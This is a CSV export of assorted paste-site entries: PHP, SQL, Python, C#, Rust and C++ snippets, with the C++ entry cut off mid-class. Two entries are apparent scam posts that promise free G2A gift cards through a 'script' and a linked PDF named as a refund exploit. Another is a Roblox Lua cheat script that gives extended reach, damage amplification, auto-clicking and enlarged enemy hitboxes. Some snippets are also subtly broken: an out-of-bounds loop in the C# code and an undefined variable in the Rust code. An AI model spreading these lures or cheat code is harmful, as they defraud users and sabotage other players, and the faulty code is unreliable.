id,title,username,language,date,content
HGZQpY1a,Add widget area to Genesis page template,daymobrew,PHP,Monday 13th of May 2024 12:51:01 PM CDT,"<?php
// In functions.php (or a functional plugin)
add_action( 'genesis_setup', 'dcwd_register_genesis_widget_area' );
function dcwd_register_genesis_widget_area() {
	// Register widget areas.
	genesis_register_sidebar(
	[
		'id'          => 'avijit-footer',
		'name'        => 'Avijit Footer',
		'description' => 'This is the widget area for Avijit.',
	]
	);
}


// In the 'forum' page template
// Customize site footer
add_action( 'genesis_footer', 'leaguewp_custom_footer' );
function leaguewp_custom_footer() { ?>
<div class=""site-footer""><div class=""wrap""><p></p>
<?php
// This is the new code.
genesis_widget_area(
		'avijit-footer',
		[
			'before' => '<div class=""avijit-footer widget-area"">',
			'after'  => '</div>',
		]
	);

?>
</div></div>
<?php
}
"
QwBrp2Bx,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Monday 13th of May 2024 12:38:22 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
13 May 2024"
jtJfak9E,Example database,otkalce,SQL,Monday 13th of May 2024 12:22:12 PM CDT,"USE [master]
GO

CREATE DATABASE [Exercise11]
GO

USE [Exercise11]
GO

CREATE TABLE [dbo].[Artist](
	[Id] [int] IDENTITY(1,1) NOT NULL,
	[Name] [nvarchar](256) NOT NULL,
	CONSTRAINT [PK_Artist] PRIMARY KEY CLUSTERED 
	(
		[Id] ASC
	)
)
GO

CREATE TABLE [dbo].[Audio](
	[Id] [int] IDENTITY(1,1) NOT NULL,
	[CreatedAt] [datetime2](7) NOT NULL,
	[Title] [nvarchar](256) NOT NULL,
	[GenreId] [int] NOT NULL,
	[Duration] [int] NOT NULL,
	[Url] [nvarchar](256) NULL,
	[Year] [int] NULL,
	[ArtistId] [int] NOT NULL,
	[DeletedAt] [datetime2](7) NULL,
	CONSTRAINT [PK__Audio__3214EC072AFFAF4D] PRIMARY KEY CLUSTERED 
	(
		[Id] ASC
	)
)
GO

CREATE TABLE [dbo].[AudioTag](
	[Id] [int] IDENTITY(1,1) NOT NULL,
	[AudioId] [int] NOT NULL,
	[TagId] [int] NOT NULL,
	PRIMARY KEY CLUSTERED 
	(
		[Id] ASC
	)
)
GO

CREATE TABLE [dbo].[Genre](
	[Id] [int] IDENTITY(1,1) NOT NULL,
	[Name] [nvarchar](256) NOT NULL,
	PRIMARY KEY CLUSTERED 
	(
		[Id] ASC
	)
)
GO

CREATE TABLE [dbo].[Tag](
	[Id] [int] IDENTITY(1,1) NOT NULL,
	[Name] [nvarchar](10) NOT NULL,
	PRIMARY KEY CLUSTERED 
	(
		[Id] ASC
	)
)
GO

CREATE TABLE [dbo].[USER](
	[Id] [int] IDENTITY(1,1) NOT NULL,
	[Username] [nvarchar](50) NOT NULL,
	[PwdHash] [nvarchar](256) NOT NULL,
	[PwdSalt] [nvarchar](256) NOT NULL,
	[FirstName] [nvarchar](256) NOT NULL,
	[LastName] [nvarchar](256) NOT NULL,
	[Email] [nvarchar](256) NOT NULL,
	[Phone] [nvarchar](256) NULL,
	CONSTRAINT [PK_User] PRIMARY KEY CLUSTERED 
	(
		[Id] ASC
	)
)
GO

CREATE TABLE [dbo].[UserAudioPermission](
	[Id] [int] NOT NULL,
	[UserId] [int] NOT NULL,
	[AudioId] [int] NOT NULL,
	CONSTRAINT [PK_UserAudioPermission] PRIMARY KEY CLUSTERED 
	(
		[Id] ASC
	)
)
GO

SET IDENTITY_INSERT [dbo].[Artist] ON 
GO
INSERT [dbo].[Artist] ([Id], [Name]) VALUES (1, N'Tina Turner')
INSERT [dbo].[Artist] ([Id], [Name]) VALUES (2, N'Van Halen')
INSERT [dbo].[Artist] ([Id], [Name]) VALUES (3, N'DJ Snake')
INSERT [dbo].[Artist] ([Id], [Name]) VALUES (4, N'Louis Armstrong')
INSERT [dbo].[Artist] ([Id], [Name]) VALUES (5, N'Maroon 5')
INSERT [dbo].[Artist] ([Id], [Name]) VALUES (6, N'Sia')
INSERT [dbo].[Artist] ([Id], [Name]) VALUES (7, N'Editors')
SET IDENTITY_INSERT [dbo].[Artist] OFF
GO

SET IDENTITY_INSERT [dbo].[Audio] ON 
GO
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (2, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'Moves Like Jagger (feat. Christina Aguilera)', 1, 278, N'https://www.youtube.com/watch?v=iEPTlhBmwRg', 2010, 5, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (3, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'The Greatest', 7, 351, N'https://www.youtube.com/watch?v=GKSRyLdjsPA', 2016, 6, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (4, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'All The Kings', 10, 310, N'https://www.youtube.com/watch?v=d2oSgaRb9Bg', 2016, 7, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (8, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'What''s Love Got to Do with It', 3, 226, N'https://www.youtube.com/watch?v=oGpFcHTxjZs', 1984, 1, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (10, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'The Best', 8, 249, N'https://www.youtube.com/watch?v=GC5E8ie2pdM', 1989, 1, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (11, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'Jump', 11, 242, N'https://www.youtube.com/watch?v=SwYN7mTi6HM', 1984, 2, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (12, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'Lean On', 5, 178, N'https://www.youtube.com/watch?v=YqeW9_5kURI', 2015, 3, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (13, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'What a Wonderful World', 4, 138, N'https://www.youtube.com/watch?v=rBrd_3VMC3c', 1967, 4, NULL)
INSERT [dbo].[Audio] ([Id], [CreatedAt], [Title], [GenreId], [Duration], [Url], [Year], [ArtistId], [DeletedAt]) VALUES (14, CAST(N'2023-04-05T00:00:00.0000000' AS DateTime2), N'We Have All The Time In The World', 4, 194, N'https://www.youtube.com/watch?v=RMxRDTfzgpU', 1969, 4, NULL)
SET IDENTITY_INSERT [dbo].[Audio] OFF
GO

SET IDENTITY_INSERT [dbo].[AudioTag] ON 
GO
INSERT [dbo].[AudioTag] ([Id], [AudioId], [TagId]) VALUES (1, 3, 12)
GO
SET IDENTITY_INSERT [dbo].[AudioTag] OFF
GO

SET IDENTITY_INSERT [dbo].[Genre] ON 
GO
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (1, N'Pop')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (2, N'Hip-hop')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (3, N'Rock')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (4, N'Jazz')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (5, N'Dance')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (6, N'Dubstep')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (7, N'Electro')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (8, N'R&B')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (9, N'Country')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (10, N'Indie')
INSERT [dbo].[Genre] ([Id], [Name]) VALUES (11, N'Pop-rock')
GO
SET IDENTITY_INSERT [dbo].[Genre] OFF

SET IDENTITY_INSERT [dbo].[Tag] ON 
GO
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (1, N'listening')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (2, N'radio')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (3, N'music')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (4, N'event')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (8, N'beat')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (9, N'producer')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (10, N'art')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (11, N'style')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (12, N'nowplaying')
INSERT [dbo].[Tag] ([Id], [Name]) VALUES (13, N'video')
GO
SET IDENTITY_INSERT [dbo].[Tag] OFF
GO

ALTER TABLE [dbo].[Audio]  WITH CHECK ADD  CONSTRAINT [FK_Audio_Artist] FOREIGN KEY([ArtistId])
REFERENCES [dbo].[Artist] ([Id])
GO
ALTER TABLE [dbo].[Audio] CHECK CONSTRAINT [FK_Audio_Artist]
GO
ALTER TABLE [dbo].[Audio]  WITH CHECK ADD  CONSTRAINT [FK_Audio_Genre] FOREIGN KEY([GenreId])
REFERENCES [dbo].[Genre] ([Id])
GO
ALTER TABLE [dbo].[Audio] CHECK CONSTRAINT [FK_Audio_Genre]
GO
ALTER TABLE [dbo].[AudioTag]  WITH CHECK ADD  CONSTRAINT [FK_AudioTag_Audio] FOREIGN KEY([AudioId])
REFERENCES [dbo].[Audio] ([Id])
GO
ALTER TABLE [dbo].[AudioTag] CHECK CONSTRAINT [FK_AudioTag_Audio]
GO
ALTER TABLE [dbo].[AudioTag]  WITH CHECK ADD  CONSTRAINT [FK_AudioTag_Tag] FOREIGN KEY([TagId])
REFERENCES [dbo].[Tag] ([Id])
GO
ALTER TABLE [dbo].[AudioTag] CHECK CONSTRAINT [FK_AudioTag_Tag]
GO
ALTER TABLE [dbo].[UserAudioPermission]  WITH CHECK ADD  CONSTRAINT [FK_UserAudioPermission_Audio] FOREIGN KEY([AudioId])
REFERENCES [dbo].[Audio] ([Id])
GO
ALTER TABLE [dbo].[UserAudioPermission] CHECK CONSTRAINT [FK_UserAudioPermission_Audio]
GO
ALTER TABLE [dbo].[UserAudioPermission]  WITH CHECK ADD  CONSTRAINT [FK_UserAudioPermission_User] FOREIGN KEY([UserId])
REFERENCES [dbo].[USER] ([Id])
GO
ALTER TABLE [dbo].[UserAudioPermission] CHECK CONSTRAINT [FK_UserAudioPermission_User]
GO
"
upEg1M3Z,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Monday 13th of May 2024 12:15:19 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_205541.pdf

Working as of:
13 May 2024"
SmkyYpqK,stfo comp dont use reach,jisdfhjdsgf,Lua,Monday 13th of May 2024 10:59:39 AM CDT,"-- [[  Reacher MODIFIED v2.0.1 ]]
--This version was modified by LiteralIyMatt (m.#0115)
--Designed for Steal Time From Others & Be The Best by Detourious
--Game can be found at: https://www.roblox.com/games/6361937392/steal-time-from-others-be-the-best
--================================WARNING================================
--THIS SCRIPT IS DESIGNED FOR A VERY NICHE TYPE OF SWORD, THIS WILL CAUSE YOU TO TP AROUND PLAYERS ON MOST SWORDS.
--USE AT YOUR OWN RISK.
--================================WARNING================================
local KEY = Enum.KeyCode
local Settings = {
	Keybinds = {
		[""INCREASE""] = KEY[""Q""];
		[""DECREASE""] = KEY[""E""];
		[""TOGGLE_REACH""] = KEY[""R""];
		[""TOGGLE_VISUALIZER""] = KEY[""T""];
		[""TOGGLE_DAMAGE_AMP""] = KEY[""X""];
		[""CHECK_SETTINGS""] = KEY[""C""];
		[""TOGGLE_NOTIFICATIONS""] = KEY[""V""];
		[""TOGGLE_AUTO_CLICKER""] = KEY[""B""];
		[""KILL_SCRIPT""] = KEY[""Z""];
	};
	Values = { -- Set these to what you want the default values for each to be upon execution
		[""distance""] = 3.5; 
		[""enabled""] = true;
		[""notifications""] = true;
		[""visualizer""] = true;
		[""damage_amp""] = true;
		[""auto_clicking""] = true;
		[""cooldown""] = false;
		[""killed""] = true;
	};
	DISTANCE_INCREMENT = 0.5; -- How much will be added/removed upon distance increase/decrease
	COOLDOWN = 0.05; -- How long the cooldown is on regular FTI (NOT FOR DAMAGE AMP)
}


-- Services
local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local StarterGui = game:GetService(""StarterGui"")

-- Globals
local F = string.format
local Upper = string.upper

-- Statics
local SPEED_COLOR = 1
local WHITELIST = {""Head"", ""Torso"", ""Right Arm"", ""Left Arm"", ""Right Leg"", ""Left Leg"", }
 
-- Non statics
local connections = {}
local instances = {}

-- Instances
local localPlayer = Players.LocalPlayer

local Notify = function(x)
	if Settings.Values.notifications == true then
		StarterGui:SetCore(""SendNotification"", {
			Title = "" Reach v3.0"";
			Text = x;
		})
	end
end

connections.InputBegan = UserInputService.InputBegan:Connect(function(INPUT, GPE)
	if GPE then return end
	local KEY = INPUT.KeyCode
	if KEY == Settings.Keybinds.INCREASE then
		Settings.Values.distance = Settings.Values.distance + Settings.DISTANCE_INCREMENT
		Notify(F(""Distance: %s"", Settings.Values.distance))
	elseif KEY == Settings.Keybinds.DECREASE then
		Settings.Values.distance = Settings.Values.distance - Settings.DISTANCE_INCREMENT
		Notify(F(""Distance: %s"", Settings.Values.distance))
	elseif KEY == Settings.Keybinds.TOGGLE_REACH then
		Settings.Values.enabled = not Settings.Values.enabled
		Notify(F(""Reach: %s"", tostring(Settings.Values.enabled)))
	elseif KEY == Settings.Keybinds.TOGGLE_DAMAGE_AMP then
		Settings.Values.damage_amp = not Settings.Values.damage_amp
		Notify(F(""Damage Amp: %s"", tostring(Settings.Values.damage_amp)))
	elseif KEY == Settings.Keybinds.TOGGLE_VISUALIZER then
		Settings.Values.visualizer = not Settings.Values.visualizer
		Notify(F(""Visualizer: %s"", tostring(Settings.Values.visualizer)))
	elseif KEY == Settings.Keybinds.TOGGLE_NOTIFICATIONS then
		Settings.Values.notifications = not Settings.Values.notifications
	elseif KEY == Settings.Keybinds.CHECK_SETTINGS then
		local str = F(""Distance: %s\nDamage Amp: %s\nCooldown: %s"", Settings.Values.distance, tostring(Settings.Values.damage_amp), tostring(Settings.Values.cooldown))
		Notify(str)
	elseif KEY == Settings.Keybinds.TOGGLE_AUTO_CLICKER then
		Settings.Values.auto_clicking = not Settings.Values.auto_clicking
		Notify(F(""Auto Clicking: %s"", tostring(Settings.Values.auto_clicking)))
	elseif KEY == Settings.Keybinds.KILL_SCRIPT then
		Settings.Values.killed = true
		Notify(""DISABLED"")
		for _, connection in pairs(connections) do
			pcall(function()
				connection:Disconnect()
			end)
		end
		for _, part in pairs(instances) do
			part:Destroy()
		end
	end
end)

local FireFakes = function(handle, part)
	local region = Region3.new(handle.Position + Vector3.new(-1, -1, -1), handle.Position + Vector3.new(1, 1, 1))
	local objects = game:GetService(""Workspace""):FindPartsInRegion3(region)
	for i, instance in pairs(objects) do
		if instance:IsA(""Part"") and instance:FindFirstChild(""TouchTransmitter"") and instance.Parent.ClassName ~= ""Tool"" then
			coroutine.wrap(function()
				firetouchinterest(part, handle ,0)
				task.wait()
				firetouchinterest(part, handle, 1)
			end)()
		end
	end
end

local FireTouchInterest = function(handle, part)
	coroutine.wrap(FireFakes)(handle, part)
	coroutine.wrap(function()
		firetouchinterest(part, handle ,0)
		task.wait()
		firetouchinterest(part, handle, 1)
	end)()
end

local BindVisualizer = function(obj)
	while obj.Parent == game:GetService(""CoreGui"") do
		pcall(function()
			local selectionBox = instances[""visualizer""]:FindFirstChildOfClass(""SelectionBox"")
			for i = 0, 1, 0.001 * SPEED_COLOR do
				selectionBox.Color3 = Color3.fromHSV(i, 1, 1)
				selectionBox.SurfaceColor3 = Color3.fromHSV(i, 1, 1)
				task.wait()
			end
		end)

		if Settings.Values.killed == true then
			break
		end
		task.wait()
	end
end

connections.Heartbeat = RunService.Heartbeat:Connect(function()
	local character = localPlayer.Character
	
	if not character then return end
	
	local sword = character:FindFirstChildOfClass(""Tool"")
	local humanoidRootPart = character:FindFirstChild(""HumanoidRootPart"")
	local humanoid = character:FindFirstChild(""Humanoid"")
	if Settings.Values.enabled and sword and sword.Handle and humanoidRootPart and humanoid then
		local handle = sword.Handle
		
		if Settings.Values.auto_clicking then
			sword:Activate()
		end
		
		if not instances[""visualizer""] and Settings.Values.visualizer == true then
			local part = Instance.new(""Part"")
			part.Name = ""_""
			part.Anchored = false
			part.CanCollide = false
			part.Massless = true
			
			local selectionBox = Instance.new(""SelectionBox"", part)
			selectionBox.Name = ""_""
			selectionBox.Adornee = part
			selectionBox.LineThickness = 0.015
			selectionBox.SurfaceTransparency = 0.5
			selectionBox.Transparency = 0
			
			part.Parent = game:GetService(""CoreGui"")
			instances[""visualizer""] = part
			BindVisualizer(part)
		elseif instances[""visualizer""] and Settings.Values.visualizer == false then
			instances[""visualizer""]:Destroy()
			instances[""visualizer""] = nil
		end
		
		if instances[""visualizer""] then
			instances[""visualizer""].Size = Vector3.new(Settings.Values.distance * 1.65, 0.55, Settings.Values.distance * 1.65)
			instances[""visualizer""].CFrame = humanoidRootPart.CFrame - (humanoidRootPart.CFrame.UpVector * 2.75) + (humanoidRootPart.CFrame.RightVector * 1.5) + (humanoidRootPart.CFrame.LookVector * 1.5)
		end
		
		for i, player in pairs(Players:GetPlayers()) do
			if player ~= localPlayer and player.Character then
				local targetCharacter = player.Character
				local targetRoot = targetCharacter:FindFirstChild(""HumanoidRootPart"")
				local targetHumanoid = targetCharacter:FindFirstChild(""Humanoid"")
				local targetPart
				
				local chosenIndex = math.random(1, #WHITELIST)
				local last
				for i = 1, #WHITELIST do
					if i == chosenIndex and targetCharacter:FindFirstChild(WHITELIST[i]) then
						targetPart = targetCharacter:FindFirstChild(WHITELIST[i])
						if targetPart and targetPart.Transparency <= 0.8 then
							break
						else
							last = nil
							break
						end
					end
					last = i
				end
				if not targetRoot or not targetHumanoid or last == nil then return end
				
				if (handle.Position - targetRoot.Position).Magnitude <= Settings.Values.distance then
					if Settings.Values.damage_amp == true then
						for _,v in pairs({""Right Arm"", ""Right Arm"", ""Left Arm"", ""Torso""}) do
							local part = targetCharacter:FindFirstChild(v)
							if part and part.Transparency <= 0.8 and targetHumanoid.Health > 0 then
								for i = 1, math.random(1, 2) do
									FireTouchInterest(part, handle)
								end
							else
								break
							end
						end
					elseif Settings.Values.cooldown == false then
						Settings.Values.cooldown = true
						FireTouchInterest(targetPart, handle)
						task.wait(Settings.COOLDOWN)
						Settings.Values.cooldown = false
					end
				end
			end
		end
	else -- GC instances since everythings disabled
		for i,v in pairs(instances) do
			v:Destroy()
			instances[i] = nil
		end
	end
end)

_G.HeadSize = 25
_G.Disabled = true

game:GetService('RunService').RenderStepped:connect(function()
if _G.Disabled then
for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 1
v.Character.HumanoidRootPart.BrickColor = BrickColor.new(""Really blue"")
v.Character.HumanoidRootPart.Material = ""Neon""
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)"
sL8TX6EE,very good minimax pomoci '.' a korektni result a dpeth,max2201111,Python,Monday 13th of May 2024 10:44:19 AM CDT,"import chess
from itertools import permutations
from functools import lru_cache

def generate_chess_positions(pieces):
    all_squares = [chess.SQUARES[i] for i in range(64)]
    unique_fens = set()
    for squares in permutations(all_squares, len(pieces)):
        board = chess.Board(None)
        board.clear_board()
        for piece, square in zip(pieces, squares):
            board.set_piece_at(square, chess.Piece.from_symbol(piece))
        if board.is_valid():
            unique_fens.add(board.fen())
    return unique_fens

def evaluate_board(board, depth):
    if board.is_checkmate():
        return 1000 - depth if not board.turn else -1000 + depth
    elif board.is_stalemate() or board.is_insufficient_material():
        return 0
    return 4  # Basic heuristic for non-terminal positions

@lru_cache(maxsize=None)
def minimax(fen, depth, alpha, beta, maximizing_player, max_depth):
    board = chess.Board(fen)
    if depth == max_depth or board.is_game_over():
        return evaluate_board(board, depth)

    best_eval = float('-inf') if maximizing_player else float('inf')
    for move in board.legal_moves:
        board.push(move)
        eval = minimax(board.fen(), depth + 1, alpha, beta, not maximizing_player, max_depth)
        board.pop()

        if maximizing_player:
            best_eval = max(best_eval, eval)
            alpha = max(alpha, eval)
            if beta <= alpha:
                break
        else:
            best_eval = min(best_eval, eval)
            beta = min(beta, eval)
            if beta <= alpha:
                break

    return best_eval

# Hlavní část kódu
initial_pieces = ['K', 'k', 'Q']
unique_positions = generate_chess_positions(initial_pieces)
evaluations = []

print(""Počet unikátních pozic:"", len(unique_positions))

# Omezení na prvních 10000 pozic
for fen in list(unique_positions)[:10000]:
    print(""."", end='')  # Tisk teček pro sledování průběhu
    board = chess.Board(fen)
    max_depth = 8  # Limit depth for demonstration purposes
    evaluation = minimax(fen, 0, float('-inf'), float('inf'), board.turn == chess.WHITE, max_depth)
    evaluations.append((fen, evaluation))

# Print results
for position, eval in evaluations:
    if eval != 0 and eval != 4:
        print(f""FEN: {position}, Evaluation: {eval}"")
"
9XLmcwzA,ДЗ Локальные максимумы,TeT91,C#,Monday 13th of May 2024 10:23:09 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Random random = new Random();
            int minValue = 0;
            int maxValue = 10;

            int arrayLenght = 30;
            int[] numbers = new int[arrayLenght];

            for (int i = 0; i < numbers.Length; i++)
            {
                numbers[i] = random.Next(minValue, maxValue + 1);
                Console.Write(numbers[i] + "" "");
            }

            Console.WriteLine();

            if (numbers[0] > numbers[1])
            {
                Console.WriteLine(""Локальный максимум "" + numbers[0]);
            }

            for (int i = 1; i < numbers.Length; i++)
            {
                    if (numbers[i] > numbers[i + 1] && numbers[i] > numbers[i - 1])
                    {
                        Console.WriteLine(""Локальный максимум "" + numbers[i]);
                    }
            }

            if (numbers[numbers.Length - 1] > numbers[(numbers.Length - 1) - 1])
            {
                Console.WriteLine(""Локальный максимум "" + numbers[numbers.Length - 1]);
            }

            Console.ReadLine();
        }
    }
}"
5dj7ycSB,Untitled,dereksir,Rust,Monday 13th of May 2024 10:05:47 AM CDT,"// import necessary crates
extern crate html5ever;
extern crate reqwest;

use std::default::Default;

// import necessary modules from html5ever
use html5ever::tendril::*;
use html5ever::tokenizer::BufferQueue;
use html5ever::tokenizer::{TagToken, StartTag, EndTag};
use html5ever::tokenizer::{Token, TokenSink, TokenSinkResult, Tokenizer, TokenizerOpts,};
use html5ever::tokenizer::CharacterTokens;

// define a struct to hold the state of the parser
struct TokenPrinter {
    // define flags to track token location. 
    in_price_tag: bool,  
    in_span_tag: bool,   
    in_bdi_tag: bool,    
    price: String,       // string to hold the price
}

// implement the TokenSink trait for TokenPrinter
impl TokenSink for TokenPrinter {
    type Handle = ();

    // define function to process each token in the HTML document
    fn process_token(&mut self, token: Token, _line_number: u64) -> TokenSinkResult<()> {
        match token {
            TagToken(tag) => {
                // if the token is a start tag...
                if tag.kind == StartTag {
                    // ...and the tag is a <p> tag with class ""price""...
                    if tag.name.to_string() == ""p"" {
                        for attr in tag.attrs {
                            if attr.name.local.to_string() == ""class"" && attr.value.to_string() == ""price"" {
                                // ...set the in_price_tag flag to true
                                self.in_price_tag = true;
                            }
                        }
                    // if we're inside a <p class=""price""> tag and the tag is a <span> tag...
                    } else if self.in_price_tag && tag.name.to_string() == ""span"" {
                        // ...set the in_span_tag flag to true
                        self.in_span_tag = true;
                    // if we're inside a <p class=""price""> tag and the tag is a <bdi> tag...
                    } else if self.in_price_tag && tag.name.to_string() == ""bdi"" {
                        // ...set the in_bdi_tag flag to true
                        self.in_bdi_tag = true;
                    }
                // if the token is an end tag...
                } else if tag.kind == EndTag {
                    // ...and the tag is a <p>, <span>, or <bdi> tag...
                    if tag.name.to_string() == ""p"" {
                        // ...set the corresponding flag to false
                        self.in_price_tag = false;
                    } else if tag.name.to_string() == ""span"" {
                        self.in_span_tag = false;
                    } else if tag.name.to_string() == ""bdi"" {
                        self.in_bdi_tag = false;
                    }
                }
            },
            // if the token is a character token (i.e., text)...
            CharacterTokens(s) => {
                // ...and we're inside a <p class=""price""> tag...
                if self.in_price_tag {
                    // ...and we're inside a <span> tag...
                    if self.in_span_tag {
                        // ...add the text to the price string
                        self.price = format!(""price: {}"", s);
                    // ...and we're inside a <bdi> tag...
                    } else if self.in_bdi_tag {
                        // ...append the text to the price string and print it
                        self.price = format!(""{}{}"", self.price, s);
                        println!(""{}"", self.price);
                        // clear the price string for the next price
                        self.price.clear();
                    }
                }
            },         
            // ignore all other tokens
            _ => {},
        }
        // continue processing tokens
        TokenSinkResult::Continue
    }    
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // initialize the TokenPrinter
    let sink = TokenPrinter { in_price_tag: false, in_span_tag: false, in_bdi_tag: false, price: String::new() };

    // retrieve HTML content from target website
    //... let resp = reqwest::get(""https://www.scrapingcourse.com/ecommerce/product/adrienne-trek-jacket/"").await?.text().await?;

    // convert the HTML content to a ByteTendril
    let chunk = ByteTendril::from(resp.as_bytes());
    let mut input = BufferQueue::default();
    input.push_back(chunk.try_reinterpret::<fmt::UTF8>().unwrap());

    // initialize the Tokenizer with the TokenPrinter
    let mut tok = Tokenizer::new(
        sink,
        TokenizerOpts::default(),
    );
    // feed the HTML content to the Tokenizer
    let _ = tok.feed(&mut input);
    assert!(input.is_empty());
    // end tokenization
    tok.end();

    Ok(())
}
"
dUcMR2ic,Untitled,MeehoweCK,C++,Monday 13th of May 2024 09:58:15 AM CDT,"#include <iostream>
#include <iterator>
#include <memory>
#include <stdexcept>

template <typename T>
class MyList {
    friend std::ostream& operator<<(std::ostream& os, const MyList& list) {
        if (list.list_size == 0) {
            os << ""The list is empty\n"";
        }
        else {
            os << ""List elements:\n"";
            for (auto i : list) {
                os << '\t' << i << std::endl;
            }
        }
        return os;
    }
private:
    struct Node {
        T data;
        std::unique_ptr<Node> next;
        Node(T data) : data{ data }, next{ nullptr } {}
    };

    std::unique_ptr<Node> head;
    size_t list_size{ 0 };

public:
    MyList() : head{ nullptr } {}
    ~MyList() { clear(); }

    void push_front(const T& value) {
        std::unique_ptr<Node> newNode{ std::make_unique<Node>(value) };
        newNode->next = std::move(head);
        head = std::move(newNode);
        ++list_size;
    }

    T pop_front() {
        if (head == nullptr) {
            throw std::out_of_range(""Cannot pop from an empty list"");
        }
        T data{ std::move(head->data) };
        head = std::move(head->next);
        --list_size;
        return data;
    }

    T& front() {
        if (head == nullptr) {
            throw std::out_of_range(""List is empty"");
        }
        return head->data;
    }

    const T& front() const {
        if (head == nullptr) {
            throw std::out_of_range(""List is empty"");
        }
        return head->data;
    }

    void clear() {
        while (head != nullptr) {
            head = std::move(head->next);
            --list_size;
        }
    }

    size_t size() const { return list_size; }

    void remove(const T& value) {
        while (head != nullptr && head->data == value) {
            head = std::move(head->next);
            --list_size;
        }

        Node* current{ head.get() };
        while (current && current->next) {
            if (current->next->data == value) {
                current->next = std::move(current->next->next);
                --list_size;
            }
            else {
                current = current->next.get();
            }
        }
    }

    class ConstIterator {
    private:
        const Node* current;

    public:
        using difference_type = std::ptrdiff_t;
        using value_type = T;
        using pointer = const T*;
        using reference = const T&;
        using iterator_category = std::forward_iterator_tag;

        ConstIterator(const Node* node) : current{ node } {}

        ConstIterator& operator++() {
            if (current) {
                current = current->next.get();
            }
            return *this;
        }

        ConstIterator operator++(int) {
            ConstIterator tmp = *this;
            ++(*this);
            return tmp;
        }

        reference operator*() const {
            if (!current) {
                throw std::out_of_range(""Dereferencing a null iterator"");
            }
            return current->data;
        }

        pointer operator->() const {
            if (!current) {
                throw std::out_of_range(""Dereferencing a null iterator"");
            }
            return &current->data;
        }

        bool operator!=(const ConstIterator& other) const {
            return current != other.current;
        }

        bool operator==(const ConstIterator& other) const {
            return current == other.current;
        }
    };

    ConstIterator begin() const {
        return ConstIterator(head.get());
    }

    ConstIterator end() const {
        return ConstIterator(nullptr);
    }

    // Iterator
    class Iterator {
        Node* current;

    public:
        using difference_type = std::ptrdiff_t;
        using value_type = T;
        using pointer = T*;
        using reference = T&;
        using iterator_category = std::forward_iterator_tag;

        Iterator(Node* node) : current{ node } {}

        Iterator& operator++() {
            if (current) {
                current = current->next.get();
            }
            return *this;
        }

        Iterator operator++(int) {
            Iterator tmp = *this;
            ++(*this);
            return tmp;
        }

        reference operator*() const {
            if (!current) {
                throw std::out_of_range(""Dereferencing a null iterator"");
            }
            return current->data;
        }

        pointer operator->() const {
            if (!current) {
                throw std::out_of_range(""Dereferencing a null iterator"");
            }
            return &current->data;
        }

